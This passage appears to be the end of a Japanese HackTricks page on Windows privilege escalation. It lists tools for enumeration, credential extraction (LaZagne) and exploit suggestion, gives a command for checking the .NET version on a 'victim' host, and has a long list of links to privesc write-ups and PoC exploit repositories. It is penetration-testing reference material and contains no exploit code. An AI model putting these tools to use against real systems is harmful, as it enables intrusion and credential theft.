[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知のprivesc vulnerabilitiesを検索します（Watsonに置き換えられたため非推奨）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- ローカルチェック **(Admin rightsが必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知のprivesc vulnerabilitiesを検索します（VisualStudioでcompileする必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurationsを探してhostをenumerateします（privescより情報収集toolに近いものです）（compileが必要） **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数のsoftwareからcredentialsを抽出します（githubにprecompiled exeがあります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUpのC#移植版**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfigurationを確認します（githubにprecompiled executableがあります）。非推奨です。Win10では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 考えられるmisconfigurationsを確認します（python製のexe）。非推奨です。Win10では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この投稿に基づいて作成されたtoolです（正常に動作するためにaccesschkは不要ですが、使用することもできます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのpython）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo**の出力を読み取り、動作するexploitを推奨します（ローカルのPython）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

.NETの正しいバージョンを使ってprojectをcompileする必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。被害者のhostにインストールされている.NETのバージョンを確認するには、次のようにします。

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## References

- [1] [Windows 権限昇格の基礎](http://www.fuzzysecurity.com/tutorials/16.html)
- [2] [フォルダー権限の弱さを悪用した権限昇格](http://www.greyhathacker.net/?p=738)
- [3] [Windows 権限昇格のチートシート](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [4] [lpeworkshop - Windows / Linux ローカル権限昇格ワークショップ](https://github.com/sagishahar/lpeworkshop)
- [5] [DerbyCon 3.0 - Windows 攻撃: AT is the new black（Rob Fuller & Chris Gates）](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [6] [権限昇格 - Windows - OSCP 完全ガイド](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [7] [Windows - 権限昇格 - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [8] [Windows 権限昇格ガイド](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [9] [Windows 権限昇格チェックリスト](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [10] [Windows 権限昇格](https://github.com/frizb/Windows-Privilege-Escalation)
- [11] [ペンテスター向け Windows 権限昇格手法](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [12] [0xdf – HTB/VulnLab JobTwo: SMTP 経由の Word VBA マクロフィッシング → hMailServer の認証情報を復号 → Veeam CVE-2023-27532 で SYSTEM を取得](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [13] [HTB Reaper: format-string leak + stack BOF → VirtualAlloc ROP（RCE）と kernel token の窃取](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [14] [Check Point Research – Silver Fox を追う: kernel の影における追跡と逃走](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [15] [Unit 42 – SCADA システムに存在する特権ファイルシステムの脆弱性](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [16] [Symbolic Link Testing Tools – CreateSymlink の使い方](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [17] [過去へのリンク: Windows の symbolic link を悪用する](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF（Cobalt Strike BOF 移植版）](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI - Node.js の信頼の落とし穴: Windows における危険なモジュール解決](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Node.js モジュール: `node_modules` フォルダーからの読み込み](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits - C/C++ checklist の課題と解答](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn - RtlQueryRegistryValues 関数](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery - NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone - CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone - サービスバイナリの乗っ取り](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Microslop での Pwn2Own: CLDFLT と DirectX kernel の競合状態を連鎖させた Windows LPE](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [すべてを支配する 1 つの I/O Ring: Windows 11 における完全な読み書き exploit primitive](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [任意ファイル削除を悪用した権限昇格とその他の優れたテクニック](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC - FilesystemEoPs exploit コード](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure – WSUS 攻撃 パート 2: CVE-2020-1013、Windows 10 のローカル権限昇格 1-day](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: Credential Manager と Windows Vault を探る](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n - CVE-2019-1388 PoC](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com - Kerberos のリソースベース制約付き委任: イメージの変更が権限昇格につながるケース](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com - Windows 10 の SSH Agent から SSH 秘密鍵を抽出する](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps – エンタープライズの更新サーバーをバックドア工場に変える (0_o) – パート 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps – エンタープライズの更新サーバーをバックドア工場に変える (0_o) – パート 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s – NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
{{#include ../../banners/hacktricks-training.md}}
